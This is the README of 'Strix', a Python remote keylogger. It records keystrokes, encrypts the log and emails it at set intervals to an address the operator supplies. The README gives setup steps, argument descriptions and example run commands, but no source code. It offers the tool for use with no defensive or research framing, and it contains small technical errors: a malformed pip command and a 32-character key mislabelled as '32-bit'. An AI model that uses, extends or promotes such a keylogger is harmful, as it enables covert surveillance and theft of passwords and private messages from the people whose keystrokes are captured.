# Strix Keylogger

Named after Strix from the Roman occult and folklore, a nocturnal owl that observes and feeds in the dark. Strix is a remote keylogger tool. Running it saves keystrokes to a stream. At regular intervals, the stream is saved to an AES-256 encrypted file "log.txt.aes" and e-mailed to the e-mail address provided.

**Setup:** Run the following command to download the dependencies (they are pyAesCrypt and pynput): `pip install requirements.txt`
```

**Usage:** `python strix.py "<E-mail address>" "<App password>" [Time interval] [32-bit Encryption key]`

**Args:**

- `email` (str): E-mail address to send the reports to.
- `appPassword` (str): A generated app-specific password for authentication. Your E-mail's password does not work. For more information, visit https://support.google.com/accounts/answer/185833?hl=en

**Options:**

- `timeInterval` (int): Number of seconds in between every other e-mail sent. Default = 60.
- `key` (string): 32-bit encryption key for AES-256 encryption. Changing the length of this key changes the encryption strength.
                If unspecified, the randomly-generated password will be e-mailed with the report.

**Example:**
```bash
python strix.py "johndoe@gmail.com" "your_app_password_here"
python strix.py "johndoe@gmail.com" "your_app_password_here" 60
python strix.py 'johndoe@gmail.com' "your_app_password_here" 60 "0123456789abcdef0123456789abcdef"
```

# References
- Tanit Keylogger - [repository](https://github.com/HusseinBakri/Tanit-Keylogger/tree/master)
- Keycodes - [repository](https://github.com/attreyabhatt/Python-Keylogger/blob/master/Keycodes.txt)
- pyAesCrypt - [documentation](https://pypi.org/project/pyAesCrypt/)
- Sending e-mail attachments - [StackOverflow](https://stackoverflow.com/questions/3362600/how-to-send-email-attachments)
- Generating a 32-bit key - [StackOverflow](https://stackoverflow.com/a/70477889)